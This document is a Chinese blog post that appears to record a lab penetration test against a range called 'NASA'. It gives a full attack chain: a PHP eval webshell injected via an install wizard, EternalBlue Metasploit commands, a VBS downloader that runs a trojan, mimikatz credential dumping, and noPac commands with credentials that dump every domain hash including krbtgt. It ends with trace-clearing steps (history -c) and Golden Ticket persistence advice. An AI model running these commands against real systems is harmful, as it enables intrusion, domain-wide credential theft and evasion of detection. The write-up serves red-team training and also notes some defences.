---
title: "NASA 域渗透实战全记录 | 从外网打点到域控完全控制"
date: 2026-04-25T22:00:00+08:00
draft: false
author: "偶记"
categories: ["渗透测试"]
tags: ["域渗透", "noPac", "EternalBlue", "内网穿透"]
---


本文记录了一次完整的 NASA 靶场渗透过程，从外网打点、WebShell 获取、Linux 提权，到内网横向移动，最终利用 noPac（CVE-2021-42278 + CVE-2021-42287）拿下域控。整个过程使用真实工具链和命令，适合红蓝对抗爱好者参考。




### 目标环境
| 主机名 | 外网 IP | 内网 IP | 账号 | 密码 |
| --- | --- | --- | --- | --- |
| ubuntu | 192.168.59.138 | - | ubuntu | QWEasd444 |
| win2003 | 192.168.59.144 | 10.10.10.137 | administrator | admin555 |
| win7 | 192.168.59.197 | 10.10.10.142 | win7 | admin555 |
| 19server-01 | - | 10.10.10.140 | nasa\administrator | QWEasd.123 |
| 19server-02 | - | 10.10.10.141 | nasa\administrator | QWEasd.123 |
| 域用户 | - | - | nasa\test | QWEasd!@#999 |


### 1. 外网打点
+ 使用 nmap、fscan 进行端口和服务扫描。
+ 目录扫描发现后台入口 /admin/webadmin.php。
+ 题目名称含 “nasa”，生成针对性字典成功爆破后台密码 **nasa123**。

### 2. 获取 WebShell（代码注入）
目标站点为**逍遥商城系统**，安装向导文件 install/index.php 在未安装（install/install.lock 不存在）时存在严重漏洞。

**利用思路**：

+ 访问 http://target/install/index.php 进入安装界面。
+ 在数据库配置环节注入一句话木马：xy_');eval($_POST['cmd'])（利用 SQL 拼接构造恶意 config.php）。
+ 删除 install/install.lock 文件（任意文件删除漏洞或手动操作）。
+ 蚁剑连接后门：http://192.168.178.140/config.php。

**关键代码片段**（install/index.php）：

PHP

```plain
if ($result) {
    // ... 省略
    $config = "<?php\n"
        . "\$pe['db_host']   = '{$_p_db_host}';\n"
        // ...
        . "define('dbpre', '{$_p_dbpre}');\n"
        . "?>";
    file_put_contents("{$pe['path_root']}config.php", $config);
}
```

### 3. Linux 提权
上传 LinEnum.sh 进行本地枚举。

**关键发现**：

+ 当前用户为 www-data。
+ 主机实际运行在 **Docker 容器** 中（/ .dockerenv）。
+ 存在 SUID 文件 /usr/bin/find（可利用但受 Docker 限制）。
+ MySQL root 密码为空，可直接登录。
+ 提权受限，最终选择横向移动至 Windows 内网。

### 4. 内网横向渗透
#### 4.1 Win7（192.168.59.197 / 10.10.10.142）—— EternalBlue (MS17-010)
使用 Metasploit exploit/windows/smb/ms17_010_eternalblue 直接打出 **SYSTEM** 权限 Meterpreter：

Bash

```plain
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.226.197
msf > exploit
```

成功后：

+ autoroute 添加内网路由 10.10.10.0/24。
+ 启动 SOCKS5 代理（auxiliary/server/socks_proxy）。
+ proxychains4 穿透后续扫描。

#### 4.2 Win2003（192.168.59.144 / 10.10.10.137）—— MS17-010
使用 auxiliary/admin/smb/ms17_010_command 执行命令：

Bash

```plain
# 下载木马（VBS 一行命令）
set COMMAND "echo dim xHttp... > dl.vbs && cscript dl.vbs && del dl.vbs"
run

# 执行木马
set COMMAND "start /b C:\Windows\Temp\muma0411.exe"
run
```

成功上线 **SYSTEM** 权限（32位木马）。

### 5. 域信息收集
+ 在 Win7 上用域用户 nasa\test 登录，mimikatz 抓取凭证：
    - nasa\test : QWEasd!@#999
    - 其他本地/域机器哈希
+ fscan 内网扫描确认域控 10.10.10.140（AD01）开放 445/389/636 等端口。

### 6. noPac（CVE-2021-42278 + CVE-2021-42287）打域控
**第一步：扫描是否可利用**

Bash

```plain
proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140
```

**第二步：利用**

Bash

```plain
proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.140 \
  --impersonate administrator -dump
```

**执行结果**：

+ 成功添加临时机器账户并 spoof sAMAccountName。
+ 获得 administrator 的 TGT（.ccache 文件）。
+ 完整 dump 出 SAM、LSA Secrets、NTDS 所有域用户哈希和 Kerberos keys（含 krbtgt）。

**注意**：执行结束后会出现清理阶段的非致命报错（删除临时计算机账户失败、服务停止失败、Python Bad file descriptor），**不影响已获取的票据和哈希**。

### 7. 痕迹清理建议（推荐）
1. **删除临时计算机账户**（最重要）：Bash

```plain
export KRB5CCNAME=administrator_AD01.nasa.gov.ccache
python3 -m impacket.ldap_shell nasa.gov/Administrator -dc-ip 10.10.10.140 -no-pass -k
# 在 shell 中执行：delete computer WIN-1EASNY7BHEK$
```

2. **清理本地痕迹**：Bash

```plain
rm -f *.ccache
history -c && history -w
```

3. **后续持久化推荐**：
    - 使用 krbtgt hash 制作 **Golden Ticket**。
    - DCSync 持续同步哈希。
    - 避免直接修改普通用户密码（对已拿票据无效），真正有效的防守是重置 krbtgt 密码两次 + 打补丁 + 关闭 MachineAccountQuota。

### 总结与收获
+ **外网**：合理利用业务系统安装向导的代码注入是最快路径。
+ **内网**：经典 MS17-010 在老系统上依然威力巨大。
+ **域控**：noPac 在 MachineAccountQuota 未限制的环境下几乎是“核弹级”利用。
+ **工具链**：Metasploit + Cobalt Strike + proxychains + noPac 配合完美。

**声明**：本文仅用于学习和靶场复现，请在授权环境下进行测试，严禁用于非法用途。

